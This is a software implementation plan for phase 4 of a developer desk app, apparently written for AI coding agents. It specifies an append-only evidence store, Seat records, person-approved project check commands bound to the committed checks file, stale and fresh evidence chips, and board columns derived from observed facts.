# The Evidence Ledger Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make what the desk observed durable and visible: every Seat the desk keeps leaves an immutable record that survives a restart, a project's named checks (`.harnessdesk/checks.yml`, as committed) run from a card only after a person has approved the command on this machine, for this repository and this version of the file, the desk records check, diff, pull-request and CI facts bound to the commit they were true at, a card carries them as chips that go stale — drawn, never green — when its branch moves, the board's columns come from those facts — *Ready* only on a current one — a conversation's details show its Seat record, a project's page lists its checks, and a backup carries all of it.

**Architecture:** Two stacked pull requests, the way phase 2 was built. **Part A** (Tasks 1–14) is the host, with no screen: the durable types and the seam with phase 3 (`packages/protocol/src/evidence.ts`), an append-only store of one folder per project under `~/.harnessdesk/evidence/` (`packages/server/src/evidence/store.ts`, read through one rule in `records.ts`), what git says about a checkout (`revision.ts`), the Seat record written when a seat is kept and read back after a restart (`seats.ts`, the registry's restore hook), `checks.yml` read strictly, as one committed git blob (`checks-file.ts`), what this machine has approved (`seen.ts`, its own file — bound to the repository and the file's generation, and signed), a runner that keeps the end of a command's output and gives the command none of the desk's environment (`run.ts`), a board's evidence with each fact's freshness (`board.ts`), the gate that runs a named check (`check-runs.ts`), the diff, pull request and CI the desk observes (`forge.ts`, `observe.ts`), a flow's check step recorded as evidence, and the backup. One class the host holds, `EvidencePlane` (`plane.ts`), composes them and is what wire methods reach as `ctx.evidence`. Four verbs — `evidence/seat`, `evidence/checks`, `evidence/board`, `evidence/check/run` — and one notification, `evidence/changed`. **Part B** (Tasks 15–23) is the interface: evidence in the renderer's state and words, a card's chips and the dialog a chip opens, *Run <check>* with its first-run question, the placement rule and the board's derived columns, a conversation's Seat record in its details, a project's checks on its page, the documentation, and a verification run in the real app with one picture per surface.

**Tech Stack:** TypeScript (ESM, `node16` resolution — every relative import in `packages/server` ends `.js`), `node:test` + `node:assert/strict` for server tests built into `packages/server/dist/test`, React 19 + Vitest + Testing Library (jsdom) for the renderer, the repository's own `parseYaml` (`packages/server/src/yaml.ts`), `git` and the person's own `gh` through `execFile`, pnpm workspaces. No new dependency.

**Tasks** — 23, every one written with its complete code, commands and expected output:

- Part A: 1 the Seat record's type, and the seam with phase 3 · 2 the evidence store · 3 what git says about a checkout · 4 a Seat record for every seat an Agent takes · 5 a flow's seats, and a deleted conversation · 6 a restarted desk knows its Seats · 7 `.harnessdesk/checks.yml` · 8 what this machine has approved · 9 running a command, and keeping the end of it · 10 a board's evidence · 11 running a named check for a card · 12 diff, pull request and CI, observed · 13 a flow's check leaves evidence · 14 a backup carries evidence and Seat records.
- Part B: 15 evidence in the renderer · 16 a card's evidence, drawn · 17 running a check from a card · 18 where a card belongs, from the facts · 19 the board's columns come from the facts · 20 a conversation's Seat record · 21 a project's checks on its page · 22 the documentation · 23 verified in the real app, one picture per surface.

**How Part A was proven before it was written down.** Every Part A task's code and tests below were compiled with `tsc -b` and run with `node --test` against a scratch copy of the tree at `c1ac5196` with phase 2's Task 10 (`e7af6597`) applied and `SeatedAs.name` (phase 2's Task 20) mirrored, and each named mutation in a task's proof step was run and went red. The whole server and protocol suite then passed — 2,475 tests — with Task 14's named edit to the pinned key list. This revision was proven the same way: every Part A test file re-run, the whole suite re-run, and each new mutation — 41 of them: the store's, the reading rule's, the restore's, the board's, the gate's, the approvals', the runner's, the checks file's, and the seam's type test — made and seen red. How Part B was proven, and what of it was not, is said at the head of Part B: it was run against the design-system commit it names and a stand-in for phase 2's `lib/agents.ts`.

---

## Before you start

This plan is written against phase 2 **merged**: Part A (Tasks 1–10, with Task 10 as it landed in `e7af6597` and its corrections 8–12) and Part B (Tasks 11–22). Where a task below edits a file phase 2 also edits, it is written against phase 2's end state and its first step confirms the anchor it edits.

Two things outside phase 2 are prerequisites, named again in the header of every task that needs them:

1. **The design system's state vocabulary: `4382ded9` from `claude/ui-roles` — cherry-pick it, or the roles PR once it is on main.** It is the UI-system session's commit, landing inside its roles pull request rather than as one of its own; it applies cleanly on main `66f4d354`. This plan never extends those primitives; it composes them, exactly as that commit has them. Tasks 15, 16, 17 and 19 name it as their prerequisite; Tasks 16 and 19 confirm the shape in their first step and stop if it differs:
   - `Chip` (`packages/ui/src/design/patterns/Settings.tsx`) takes `tone?: Tone` — the system's set, `'neutral' | 'brand' | 'success' | 'warning' | 'danger' | 'info'` — plus `stale?: boolean` and `unknown?: boolean`. **Exactly one of `state` or `tone`** (`ChipProps` is a union); the words come from `children` or `label`. A `stale` chip is struck through and never drawn in the success tone; an `unknown` one is neutral; each says so to a screen reader.
   - `stateTone(state) → { label, tone }` (`packages/ui/src/design/patterns/PublicationCard.tsx`, exported from `packages/ui/src/design/index.ts`), for `'open' | 'draft' | 'merged' | 'closed' | 'passed' | 'failed' | 'running' | 'skipped' | 'timed out'` — the one map from a state to its tone, which `StatePill` reads. An outcome outside that list gets a word, never an invented state.
   - `Board` (`packages/ui/src/design/ui/board.tsx`) takes `derived`: it sets `data-derived`, draws no add slot whatever a column is passed, and an empty column says *Nothing here*. Columns learn the mode from context.
   - `MenuItem disabled="reason"` (`packages/ui/src/design/patterns/Menu.tsx`): the reason is the item's second line, tied to it with `aria-describedby`.
2. **Phase 2's `lib/agents.ts`** (its Task 12) — Task 20 uses its `ceilingWords(permission)` for the permission a Seat was told it holds.

**Nothing else in the design system is extended by this plan.** Where a surface needs a role, it uses an existing component: `Chip`, `stateTone`, `Button` (`ghost`, `content`), `KeyValue`/`KeyValueRow`, `EmptyState`, `Dialog`, `ConfirmDialog`, `Popover`, `Menu`/`MenuItem`/`MenuSeparator`, `Rows`/`Row`, `SectionHead`, `Note`, `CodeText`. No screen stylesheet is written; Tailwind classes in a screen carry layout only (flex, grid, gap, wrap, width).

---

## The seam with phase 3

Phase 3 (*Ceilings that hold*) runs in parallel with this phase, and both would otherwise edit the Seat record's type. This plan owns the durable Seat record's shape, **including both halves phase 3 writes** — the ceiling a seat ran under, and a standing order in phase 3's words — and **Task 1 lands it before anything else**, so phase 3 can start from Task 1 alone.

The type, in `packages/protocol/src/evidence.ts`:

```ts
/** The ladder a ceiling is written in, narrowest first. */
export type CeilingLevel = 'read' | 'edit' | 'publish' | 'merge'

/** A ceiling as one seat ran under it. */
export interface SeatCeiling {
  readonly level: CeilingLevel
  /** `held`: the runtime enforced it. `asked`: it was only asked of the agent. */
  readonly hold: 'held' | 'asked'
}

/**
 * What an Agent's standing order said it may do, in the words of that order's
 * generation — never translated into the other's.
 */
export type StandingOrder =
  | { readonly kind: 'permission'; readonly permission: FlowPermission }
  | { readonly kind: 'ceiling'; readonly level: CeilingLevel }

export interface SeatRecord {
  // …every other field is in Task 1…
  /** What its standing order said it may do, as the order said it: today's `permission:`, or phase 3's `ceiling:`. */
  readonly standing: StandingOrder
  /** The ceiling this seat actually ran under, and whether the runtime held it or it was only asked of the agent. Null until phase 3. */
  readonly ceiling: SeatCeiling | null
  /** Set when a backup brought the record here (Task 14); phase 3 never writes it. */
  readonly restored?: Restored | null
  // …
}
```

`SeatCeiling | null` is the brief's `{ readonly level: 'read' | 'edit' | 'publish' | 'merge'; readonly hold: 'held' | 'asked' } | null`, named so both phases import one type. Task 1's type test assigns each to the other, so neither can grow a field alone.

`StandingOrder` is why an Agent that says only `ceiling:` needs no legacy value. Phase 3 splits today's `permission: read` from a new `ceiling: read`, and there is no truthful `FlowPermission` for every ceiling — `edit` has none — so a record in phase 3's words says `{ kind: 'ceiling', level }` and nothing else, and a record in today's says `{ kind: 'permission', permission }`. Both are read by the same rule (Task 2), drawn in their own words (Task 20), and tested as types (Task 1) and as records that round-trip (Tasks 2 and 4).

**Who writes each field of a Seat record.** The opening is written once, when a seat is kept; the closing is a second record, written once.

| Field | Written by | When |
| --- | --- | --- |
| `id`, `openedAt`, `checkout` (`cwd`, `project`, `branch`, `head`) | Phase 4, the evidence plane (`seats.ts`) | When the seat is kept |
| `agent`, `briefDigest`, `seat`, `seatLabel`, `passedOver`, `session`, `board`, `role` | Phase 4, from what the seating already knows | When the seat is kept |
| `standing` | Phase 4 writes `{ kind: 'permission', permission }`; **phase 3** writes `{ kind: 'ceiling', level }` for an Agent that says only `ceiling:` | When the seat is kept |
| `ceiling` | **Phase 3** fills it; phase 4 writes `null` | When the seat is kept |
| `closed` | Phase 4 writes `deleted`; phase 5 adds `released` and `wrapped` | Once, when the desk lets the seat go |
| `restored` | Phase 4's restore (Task 14), on a record a backup brought; absent on every record this desk writes | When a backup is restored |

**The rule for phase 3: fill `ceiling` and choose `standing`'s arm, never change the type.** Phase 4 writes the two values in exactly two places, and those are the lines phase 3 changes:

1. `packages/server/src/methods/agents.ts`, in `'agent/seat'`: the `seated` literal (a `SeatedAs`) says `ceiling: null`, and the durable record takes `ceiling: seated.ceiling` and `standing: { kind: 'permission', permission }`. Phase 3 puts the effective ceiling it computed and read back there, and writes `{ kind: 'ceiling', level }` for an Agent that says only `ceiling:`.
2. `packages/server/src/evidence/seats.ts`, `flowSeatInput`: a flow's seat says `ceiling: null` and its role's `permission:`. Phase 3 puts the flow seat's effective ceiling there, if it holds flow seats to one.

One reader is phase 3's to widen, not a type: `EvidencePlane.seatedAs` (Task 6) rebuilds phase 2's in-memory `SeatedAs` — which speaks only `permission` — from a record in today's words, and answers null for one in phase 3's. Phase 3, which reshapes `SeatedAs` for ceiling-only Agents, adds that arm; the durable record already holds everything it needs.

`SeatedAs` (`packages/server/src/registry.ts`) gains the same `ceiling: SeatCeiling | null` in Task 1 — the in-memory twin the durable record is written from. Whether a surface draws it, and how (*Read · held*), is phase 3's: laying `ceiling` over `SessionSettings` in `seatedSettings` is a phase-3 edit to the same file as this plan's restore hook (Task 6), in a different function. Phase 3's `ceiling:` parser reads into `CeilingLevel` rather than defining a ladder of its own. `standing` stays beside `ceiling` on every record: what the order said, and what the seat actually ran under.

**Why now.** Records are immutable and append-only. A field added later would leave every record written before it without one — a migration of durable data; and a standing order recorded only as a `FlowPermission` would leave phase 3 inventing one for every Agent that says only `ceiling:`. So both halves exist from the first record: the store's reader refuses a Seat line with no `ceiling` key, and one whose `standing` is neither generation's (Task 2), and phase 3 changes values, not a shape. If phase 3 needs to land before this phase, it lands this plan's Task 1 first, as it stands.

---

## Decisions this plan takes

Where the roadmap and the spec are silent, or disagree with each other or with the rules this plan was handed, this plan decides — one line of why each. The report beside this plan lists the disagreements separately.

**The store**

- **NDJSON, two files per project folder** (`seats.ndjson`, `evidence.ndjson`) under `~/.harnessdesk/evidence/<name>-<hash>/`, like the audit log — append-only by construction, and a launch reads every Seat without reading a year of facts.
- **Nothing in the store can change or remove a line**; a closing is a second record, and a line a crash cut short is ended before the next is written.
- **An append answers only once it is durable.** Each line is one `write` of at most 64 KiB to a file opened for appending, so two writers put their lines in either order but never inside each other's; a short write is an error; the file is synced before the append resolves; a failed write rejects its caller and is reported again by the next `flush()`, which the quit logs.
- **One writer, not a lock.** The host holds the only store on its state directory — the desk runs one host per home — so a read inside `merge` sees every line written before it. A second store on the same folder is safe to write through, by the append promise above; it is not ordered against the first. A filesystem lock would add a failure mode (a stale lock after a crash) to protect an arrangement the desk never makes.
- **A read, a judgement and an append are one step** (`merge`), queued with every other write, so a restore's *is this already here?* cannot race another restore or a normal append.
- **One rule reads a line** (`lineOf(value, { file, project })`), used by the store and by a restore alike, so the two never disagree about what was recorded: a Seat line in the facts file, a fact in the Seats file, or a Seat opening whose checkout belongs to another project is no line. A line this build cannot read is skipped, counted and kept.
- **Every record is bounded**: 64 KiB a line; a check's tail 4,000 characters; a command 8,192; any other string 4,096; an id 200; 64 candidates passed over, 500 CI checks, 64 revisions a review names. A line past a limit is not one this build reads, and one too large to write is refused.
- **A record has an `id`** (the spec's has none): a restore has to know which records it already holds.

**What a record says**

- **Evidence records carry `card` and `checkout`** (the spec's has neither): the card is how a chip finds its card, the checkout how staleness is read against the right branch.
- **The card is `{ board, id }`**, `board` being the room's id — phase 5 keeps a room's id as its Goal's, so no record is re-keyed.
- **The check fact adds `name`, `timedOut`, `dirty` and `tail`, and `exit` may be null** — the spec's prose says a record names its check as well as its command; a check that ran over has no status; a check on uncommitted changes is bound to no commit; and a failure has to be able to say why.
- **All seven kinds of fact are in the type now; this phase produces four** (`check`, `diff`, `pr`, `ci`): records are durable, so later phases add values, not shapes.
- **The standing order is a tagged union of the two generations** (`{ kind: 'permission', permission }` today, `{ kind: 'ceiling', level }` in phase 3's words) rather than `permission` made nullable beside `ceiling`: a nullable field says only that something is missing, where the tag says which generation wrote the record, and neither arm can be written with the other's word (*The seam with phase 3*).
- **A record a backup brought says so** (`restored: { at }`) and is history: a restored fact stands as unknown until this desk observes the same question, and a restored Seat never says which Agent a conversation here is. The mark is optional, so every record this desk writes is unchanged by it.
- **The Seat record adds `seatLabel`, `passedOver`, the Agent's `name` and `origin`, `board`, `role`, and the checkout's `project`, `branch` and `head`** — the in-memory copy it replaces holds the first ones, and phase 5 derives membership from `board`.
- **A Seat closes when the desk lets it go: its conversation is deleted** (phase 5 adds released and wrapped). Closing a pane, quitting and a runtime restart are window management — the conversation reopens on the next thing addressed to it — so its Seat stays open.
- **A flow's seat is recorded with no Agent** (`agent: null`), since flows seat runtimes until phase 6.
- **An Agent's seat whose record cannot be written is closed**, as one whose brief could not be handed over is; a flow's seat whose record cannot be written is logged, because its run already exists.
- **After a restart, a conversation wears the Agent its latest Seat record names** — the latest one this desk kept, closed or not: the durable record replaces the in-memory copy phases 1–3 kept, and a Seat a backup brought never does.

**Checks, and what a person has approved** (security-critical)

- **`checks.yml` is read from the project's main checkout, as committed at its `HEAD`** — one git blob, never a seat's worktree and never the working copy: the commands a person approves are the project's, an agent editing its own copy changes nothing that runs, and nothing in the repository can swap the file or `.harnessdesk` between a check and a read, as it could between an `lstat`, a `realpath` and a `readFile`. The blob's id is the file's generation, and what is shown, approved and run are all bound to it. A working copy that differs is said, never read; a file not yet committed offers nothing until it is.
- **A check says `run` and `timeout`, nothing else**; a key the build does not read refuses the check rather than being ignored.
- **A command is printable ASCII and line feeds**, so what is shown is byte for byte what runs and no look-alike letter can stand in for another.
- **Limits**: 64 KB a file, 32 checks, 2,000 characters a command, a timeout of 1 to 14,400 seconds (600 when unsaid); a file, or a `.harnessdesk`, committed as a link is refused.
- **What was approved lives in its own file, `commands-seen.json`, with its key in `commands-seen.key`**, never in `state.json`'s preferences: `app/state/set` patches preferences wholesale and every backup restores them, and a command approved on another machine is not approved on this one. No backup carries either file.
- **An approval is the current answer only, and it is bound**: to the project's path *and* its incarnation — the identity on disk of its git directory (where it is, device, inode, when it was made), so another repository cloned at the path is another project; to the checks file's generation, so whenever the file is read and has changed in any way — a command, a name, a comment — every approval for the project is dropped, keeping only what ran before, to say so; and to this machine, by an HMAC-SHA256 under a key sealed with the desk's credential cipher (the OS keychain in the desktop app), so a copied or edited file approves nothing. A changed timeout alone still asks again, because it changes the file. A file a newer build wrote is never written over.
- **The incarnation is derived, not minted.** A host-minted id would itself have to be stored against the path, which is the thing that cannot tell two repositories apart; the git directory's identity on disk changes when the repository is replaced, and is read again every time.
- **The answer carries the text and the file generation the person was shown**, and runs only while the file is still exactly that.
- **A check runs in the card's checkout** — its holder's folder while claimed, else where this desk last observed a fact for it (never where a backup says), else the room's — and only if that folder is part of the project.
- **One check runs on a card at a time, whatever its name**: two in one checkout would each measure the other's work, and a check renamed while it runs is still that checkout. The card's menu greys every check while one runs, and says why.
- **A call is admitted from its first line.** A closing desk refuses new calls at once; one that starts closing while a call is still checking the rules stops it before it starts anything; the quit waits for every call it caught.
- **`evidence/check/run` answers once the check has started**; the fact arrives by `evidence/changed`, because a check can take twenty minutes.
- **A quit stops every running check, which leaves no fact**: nothing was observed.
- **An approved check runs with the person's full authority, as it would in their terminal, and the question says so in those words.** The desk does not sandbox it in this phase (*Deliberately not in this phase*): a strict OS sandbox — a writable checkout only, an isolated home, no network unless approved — breaks common checks; this repository's own `pnpm verify` binds loopback listeners. What the desk does is keep itself out of the check: its environment is built from an explicit list of names (`PATH`, `HOME`, the user and shell, locale and time zone, `TMPDIR`, the person's proxy; `TERM=dumb`), so none of the desk's own secrets, tokens, correlation variables or state paths — `HARNESSDESK_HOME` and the like — reach it. A check that needs another variable says so in its own command, where the person reads it before approving it. The HMAC above protects the approvals from a copied or edited file, not from code already running as the person — which an approved check is.
- **Stopping a check stops its process group, and nothing wider.** A timeout or a quit kills the group; a process that starts a session of its own is not stopped, and a desk killed outright stops nothing. The guarantee is said at that size — in `run.ts`, and by a test that shows a daemon outliving its check — rather than implied to be *everything it started*. No live-run identity is persisted across a restart: a restarted desk cannot safely signal a process id it recorded, which may by then be someone else's, and there is no container to reap (*Deliberately not in this phase*).

**Observing**

- **Freshness is read, not watched**: when a board is read — on opening, on window focus, every 30 seconds while a board is on screen — and after a fact is recorded. Phase 9 brings the ref observer.
- **Staleness counts commits on the fact's own branch in its own checkout**; a rewritten history reads *rewritten since*, and a gone checkout or branch is *unknown*, with why.
- **Diff, pull request and CI are looked at when a card is finished, and on a board read at most once every five minutes a card**; only a fact that changed is recorded.
- **The forge is read with the person's own `gh`**, in the checkout; one that cannot be read is logged and leaves no fact.
- **A fact a backup brought never steers a look**: the desk looks where *it* last observed a card, compares a look only with what *it* observed, and credits the holder's latest Seat *it* kept.
- **Every board read is stamped** when it begins, in host milliseconds, strictly later than the last, and a window keeps a room's evidence only when it is at least as new as what it drew — so a poll that began before a check ended never moves a card back after the push that told of its fact. A host restarted with its clock behind stamps lower until the clock catches up; a window drops those reads meanwhile, and the next one after that is kept.
- **A flow's check step leaves check evidence** in its round, named for its role, through the flow's own runner, unchanged until phase 6.

**The board**

- **Columns are *To do · Working · Needs you · In review · Ready*, and *Set aside* while anything is** — the spec's four, *To do* for work nobody has started, which has to go somewhere, and *Set aside* for work a person abandoned, which is settled but never good news.
- **Ready needs a current fact that says the work is good**: a fresh passing check, fresh passing CI, or a merged pull request that is fresh — or *final*, which is modelled, not assumed: a merged pull request whose branch is gone, in a checkout that is still a repository, is the last word on that branch. Nothing else is ever final; a merged pull request out of date or unknown is no verdict. A card finished with none waits in *Needs you* — a column moves on evidence, never on anyone saying it is done.
- **Cancelled CI is not passing.** It is its own verdict — after a failure, before anything still running — and puts the card in *Needs you* as *CI cancelled*.
- **A stranded claim moves to *Needs you***: it needs a person to take it over, and the card still says *stranded 3h*.
- **Abandoned work is *Set aside*, never *Ready***, whatever was observed on it: a green column has to mean the work is good. The column is drawn only while it holds a card.
- **The board takes no drag and no title** (the design system's `Board` `derived` mode): with columns that are facts there is no column to put a card in, so the roadmap's refused drag becomes each card's own reason — *verify failed*, *nothing checked*, *waiting on you* — and every verb stays in the card's menu. The quick add at a column's foot goes with it: work goes on through *New job*.
- **A card's chips sit in its foot**, pressed as one row that opens *What the desk observed*.
- **A running check is shown on its card** from the host's running list; it is not a fact.
- **A card in *Needs you* wears its reason** — *verify failed*, *CI cancelled*, *nothing checked*, and, for every fact that could decide it, *out of date* or *unknown* by name: *verify out of date*, *CI unknown*, *PR #12 out of date* — in the card's one judging chip, short enough to fit it: that column is many reasons, and a person has to know which is theirs.
- **"Waiting on you" is an open approval from the card's holder, or a flow step addressed to the person** — a card one of the running flow's own rounds opened for a person's role, never one an earlier run left behind with the same role's name; phase 5's *Needs you* list will read the same two.
- **A check the file refuses travels with the board's evidence** (`refused`, and `unreadable` for a file that cannot be read at all), so a card offers it greyed rather than hiding it; the project's page says why.

**Surfaces**

- **The Seat record is drawn at the head of the Agents inspector** (`AgentsView` in `Details.tsx`), above the sub-agents the seat started — the spec puts a runtime's delegations inside a Seat — rather than as a new inspector.
- **The project page's Checks section appears only once `.harnessdesk/checks.yml` exists**: a new noun appears only once it is used.
- **The first-run question is a `ConfirmDialog`**, not the plain `Dialog`: it is the dialog role's confirm policy — nothing focused, so a held Return runs nothing, and the backdrop does not dismiss it. Its answer is also disarmed for 600 ms after it opens (`ConfirmDialog`'s own `pending`, drawn and disabled), so a click already on its way — the second half of a double click on *Run verify* — answers nothing. A real-browser spec pins all three.
- **A check that cannot run stays in the card's menu with why as its second line** — the menu pattern's `disabled="…"`, read out with `aria-describedby` — so the card's ⋮ menu is the menu pattern (`Popover` and `Menu`), which also closes itself when something takes the screen, in place of the primitive `DropdownMenu`.
- **General › Backup's two sentences move into `lib/backup-words.ts`** with phase 2's `count` helper, so they can be tested without a screen, and count what the desk observed.
- **The verification rig's check is `node --test`** on a test file the rig commits: a real command that passes, so the frames show a real pass going stale and fresh again.
- **Words**: a check chip reads `verify ✓ @a1b2c3d` and, stale, `verify ✓ @a1b2c3d — 2 commits since`; a commit is shown by its first seven characters. The mark is written inside the label, never as a string of its own, because it is a word of the chip and not an icon.
- **A chip's tone comes from `stateTone`, the one state→tone map**, for its fact's outcome in the system's own states — a pull request's open, merged or closed; a check's passed, failed or timed out; CI's passed, failed, running or skipped; a check running now — and is neutral for a fact that names no such state: a diff, CI that was cancelled, a check that never started. `stale` and `unknown` are the `Chip`'s own, so a stale pass is never green and an unknown fact is neutral whatever it said.
- **Verbs are `evidence/*`**, and `evidence/changed` sends a room's evidence whole, as `flow/changed` does.
- **A backup's evidence is restored as history, by appending** through the store's one queued `merge`: every restored record is marked; a duplicate by id is left alone; a Seat for a conversation this desk already keeps a Seat for is refused; a closing is admitted only for a Seat opened in the same entry of the same backup and restored beside it, so a backup can never close a Seat this desk kept. The report counts restored, already here, refused and could-not-write apart, and General › Backup says them apart.
- **A restore is bounded in projects and lines** — 200 projects and 100,000 lines, each within the line limit — on top of the message that carries the backup, which the host's WebSocket already bounds at `ws`'s default 100 MiB. No separate byte budget is kept: the line count and line size bound what the store can be asked to write, and a byte budget below the message's would refuse backups this desk itself exported.
- **An export leaves out a line it cannot read, and says how many.** Such a line — a newer build's, or damaged — cannot be judged by the reading rule, so it is not carried as opaque data another desk would have to trust; it stays in the store it came from, for a build that can read it, and the export's sentence counts it.

**Where this plan declines a reviewer's finding, in whole or in part**

- **An OS-enforced sandbox for checks** (review A, Critical): declined for this phase, on the owner's decision. The first-run question says plainly that an approved check runs with the person's full authority; the check gets none of the desk's environment; and the sandbox is a named item in *Deliberately not in this phase*, because a strict one breaks common checks — this repository's own `pnpm verify` binds loopback listeners.
- **A host-minted project incarnation** (review A, Important — approvals): the approval is bound to a derived incarnation instead, for the reason under *Checks*; the rest of the finding — one current approval per project and name, bound to the file's generation, invalidated on removal, rename, replacement or any change, and signed with a machine key — is taken whole.
- **Persisting and reconciling live-run identity across a restart** (review A, Important — process group): declined; the guarantee is narrowed instead, as the finding allows, and pinned by a test. A restarted desk cannot safely signal a recorded process id, and there is no job container to reap.
- **A filesystem lock** (review B, Important — durability): the single-writer invariant is specified instead, as the finding allows; every other part — bounded records written one to a `write`, sync before answering, failures preserved through `flush`, subprocess-crash and two-instance tests — is taken whole.
- **A total-import byte limit** (review B, Important — bounds): the transport's message limit stands in for it, beside the per-field, per-line, per-project and line-count limits the finding asks for.
- **Carrying unreadable lines as opaque data** (review B, Minor): the export is made visibly incomplete instead — the other half of the finding.

---

## Global Constraints

Every task's requirements include these.

- **This plan is phase 4 of 12.** Ceilings that hold (`ceiling:`, *held*, enforcement), Goals, lanes, flows on the new nouns, findings, triggers and the ref observer are later phases. Do not reach into them. `review`, `finding` and `spend` facts are typed and never produced here.
- **Design source:** `docs/superpowers/specs/2026-09-17-agents-and-goals-design.md` › *Evidence*. Where this plan and the spec disagree, the spec is right and the plan is a bug — except where *Decisions this plan takes* above says why it departs. The roadmap's section is `docs/superpowers/plans/2026-09-17-agents-and-goals-roadmap.md` › *4. The evidence ledger*.
- **The store is `evidence`, never `ledger`.** `packages/server/src/ledger/` is the usage ledger.
- **A repository's commands are the security surface.** `.harnessdesk/checks.yml` is committed in a repository someone may have cloned. A command runs only as committed, and only after a person has approved it, verbatim, on this machine, for this repository and this version of the file; any change to the file asks again; nothing runs before that. It then runs with the person's authority and none of the desk's environment, and the question says so. Every task that reads, compares or runs those commands says so in its header and tests exactly that.
- **Every run leaves evidence without being asked** (the roadmap's *Driving an Agent*, item 6). A kept seat writes its Seat record before the desk answers; a check the desk runs, for a card or for a flow, records what it observed; a finished card has its branch looked at. Nothing waits for an agent or a person to ask for a record.
- **A failure names itself** (item 10). A refusal is a sentence with its reason and its way out — *verify runs a command this machine has not approved…*, *#3's checkout, … is not part of this project*, *lint is running on #3, and one check runs on a card at a time* — never *Internal error*. A card the facts put in *Needs you* says which fact.
- **A message between agents is never evidence** (the roadmap's *Agents messaging agents*, and rule 10). A column moves on a check, a diff, a pull request or CI — never on an agent saying it is done, in the channel or in a finish note. A message may point at evidence; the chip belongs to the evidence. Every task that derives a column or a chip has a test where an agent's message in the channel claims the tests pass and nothing moves (Tasks 10, 12, 16, 18, 19).
- **Observed, never reported.** Evidence is written by the host from something it did. Nothing an agent typed becomes a fact.
- **Stale is drawn, unknown is not zero** (rule 2). A stale chip says how far behind it is and is never green; an unknown one is neutral, and its dialog says why. Only a current fact is a verdict.
- **Sentences, not wire** (rule 4). No verb name, no seat spec, no digest and no session id appears in rendered text. A commit is its first seven characters; a brief that moved on reads *The brief has changed since this started*.
- **Greyed, never withdrawn** (rule 3). A check the project names that cannot run stays in the card's menu, greyed, with its reason as its second line.
- **The file is the truth, and the surface says which file** (rule 5). The project page's checks carry their file's path.
- **The plain path stays plain** (rule 7). A conversation never seated shows no Seat record; a board with no evidence and a project with no `checks.yml` show none of this phase's surfaces; nothing runs until a person asks. Each UI task has a test that renders the plain path and finds none of its surfaces.
- **No use case is built in** (rule 8). The desk runs whatever a project's `checks.yml` names; nothing ships a check.
- **No competitor or third-party product names** in code, comments, commit messages, PR titles or PR bodies. Rendered UI text names a runtime only through `RuntimeInfo.presentation` or a name the host supplies (AGENTS.md rule 8 — `pnpm layering` fails a brand name in rendered text).
- **No real accounts, emails or handles** in fixtures, docs, commit messages or screenshots: `Jane Doe`, `dev@example.com`, or the demo persona **Shane** at `harnessdesk.app` (AGENTS.md rule 13). Every frame comes from the rig, never a real desk.
- **Compose, don't draw** (the UI system's rules). Build screens from `packages/ui/src/design`: `Chip`, `stateTone`, `Button`, `KeyValue`, `KeyValueRow`, `EmptyState`, `Dialog`, `ConfirmDialog`, `Popover`, `Menu`, `MenuItem`, `MenuSeparator`, `Rows`, `Row`, `SectionHead`, `Note`, `CodeText`, `Board`, `BoardColumn`, `BoardCard`. No screen stylesheet; a class in a screen carries layout only (flex, grid, gap, wrap, width, position). No raw font size, colour, radius, padding or height. Icons only from `components/Icons.tsx`. **This plan edits no design primitive**; `4382ded9` above is a prerequisite, not a task. Where the design differs from the shipped system, follow the system; the choices still with the owner (selection style, the tertiary grey, one sidebar row, mono for paths and commits, group-label style, tinted or hairline cards) are not decided here — commits and paths are set in the interface face, as the system sets names today.
- **Verify what renders.** Each UI task adds a fixture to the preview harness (`packages/ui/preview.html` → `src/preview/main.tsx`, `src/preview/harness.tsx`) and runs `node script/design-audit.mjs --strict` and `pnpm test:ui-system`. The preview store answers an unknown method with `undefined`, so every new store method a screen calls is stubbed there.
- **Committed text never names another app the UI is measured against** — this plan's own numbers and reasons only.
- **A wire method is three edits in a fixed order** (AGENTS.md rule 2): declare in `packages/protocol/src/wire.ts`, validate in `packages/protocol/src/wire-validators.ts`, answer in `packages/server/src/methods/<domain>.ts`. A handler reaches the host only through `HostContext`. The new domain module is `methods/evidence.ts`, `satisfies MethodsUnder<'evidence/'>`.
- **A verb with no caller is pinned in `UNREACHED`** in `script/check-reachable.mjs` with its reason while Part A lands, and its line is removed **in the same task** that gives it a `transport.request('…')` caller in `packages/ui/src`.
- **Testing.** Server: `node:test` with `node:assert/strict`; build with `pnpm run build:node` (it is the typecheck — **never** `pnpm run typecheck`, which fails with TS6310 whatever you change), then `node --test --test-reporter=spec packages/server/dist/test/<file>.test.js`. UI: `pnpm --filter @harnessdesk/ui exec vitest run <path under packages/ui>`. Every test must be able to fail; a regression test is shown red against the unfixed code before the fix.
- **Commit after every task**, with `pnpm verify` green first, run **unpiped** with a short temp dir, reading its exit status: `mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"`. Commit by path. The commit trailer names **who wrote it**: `Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>` (or `Claude Sonnet 5`) for a Claude implementer, `Co-Authored-By: Codex GPT-5.6 Sol <agent@harnessdesk.app>` for a Codex one.
- **A proof is only a proof if it was run.** A red-first test is shown failing against the unfixed code, by actually disabling the change and watching a named test go red. Each task's proof step names the mutation to make. If a proof could not be run, the report says so in those words.
- **A test never moves below the thing it tests, and every edit to a test you were not asked to write is named.** Wire coverage without a listener is `parseClientMessage`; host behaviour without one is `host.call`. When a shared test helper changes shape, the report and the commit say so. Each task below lists the existing tests it edits, and why.
- **Never write a raw control or format character into a source file.** Spell a NUL, an escape or a direction override as `\x00`, `\x1b` or `\u{202e}` in source, and key a map by `JSON.stringify([...])`, never by a string joined on NUL: a raw NUL makes a file binary to `grep`, and a raw direction override makes a file read differently from how it runs.
- **A Codex implementer cannot commit or finish `pnpm verify`.** Its sandbox denies writes to `.git`, loopback listeners and file-watch events. It leaves the work in the tree and says so; the controller runs the full verify outside the sandbox and makes the commit.
- **Run your tests in the foreground, and do not end your turn while a background task of yours is running.**
- **Part A ships on its own.** After Task 14, `pnpm verify` is green and every new verb is either called or pinned. Part B is stacked on Part A's branch, and after Task 21 `UNREACHED` holds none of this phase's verbs.

---

## Proof needs, and routing

Every task carries one line under its **Files** block — `**Proof needs:** neither | a listener | file-watch events | the rendered UI` — so it can be routed before it is started. One writer's sandbox denies loopback listeners and file-watch events.

